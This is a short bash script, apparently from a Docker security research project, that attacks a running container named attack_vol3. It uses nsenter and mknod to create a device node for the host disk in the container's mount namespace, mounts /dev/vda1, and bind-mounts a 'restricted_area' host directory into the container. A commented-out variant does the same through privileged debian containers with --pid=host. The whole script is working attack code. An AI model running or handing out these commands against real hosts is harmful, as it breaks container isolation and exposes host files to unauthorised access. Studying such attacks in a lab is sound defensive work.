#!/bin/bash

attack="home/ubuntu/Security-on-Docker/Attacks/Hosts_fs/privileged_attacker/all_by_attacker"
#echo "Please give container's id:"
#read container_id
docker ps | grep attack_vol3 > dockerps
cut -d' ' -f1 dockerps > containerid
container_id=$(cat containerid)
docker inspect --format {{.State.Pid}} ${container_id} > PID
container_pid=$(cat PID)
rm PID
major=$(cat major_num)
minor=$(cat minor_num)
dev=$(cat sdev_of_fs)
#dev="/dev/vda1"
#Done by attacker inside host
#: <<'END'
nsenter --target ${container_pid} --mount mknod --mode 0600 ${dev} b ${major} ${minor}
nsenter --target ${container_pid} --mount mkdir -p /tmpmount
nsenter --target ${container_pid} --mount --uts --ipc --net --pid -- mount /dev/vda1 /tmpmount
nsenter --target ${container_pid} --mount --uts --ipc --net --pid -- mount -o bind /tmpmount/${attack}/restricted_area /doot
nsenter --target ${container_pid} --mount --uts --ipc --net --pid -- umount /tmpmount
#END

#Done by attacker no2
#Attack container
: <<'END'
docker run --privileged --pid=host --rm -it debian:latest nsenter --target ${container_pid} --mount mknod --mode 0600 ${dev} b ${major} ${minor}
docker run --privileged --pid=host --rm -it debian:latest nsenter --target ${container_pid} --mount mkdir -p /tmpmount
docker run --privileged --pid=host --rm -it debian:latest nsenter --target ${container_pid} --mount mount ${dev} /tmpmount
docker run --privileged --pid=host --rm -it debian:latest nsenter --target ${container_pid} --mount mount -o bind /tmpmount/${attack}/restricted_area /doot
docker run --privileged --pid=host --rm -it debian:latest nsenter --target ${container_pid} --mount umount /tmpmount
END

rm dockerps
rm containerid
rm major_num
rm minor_num
rm sdev_of_fs
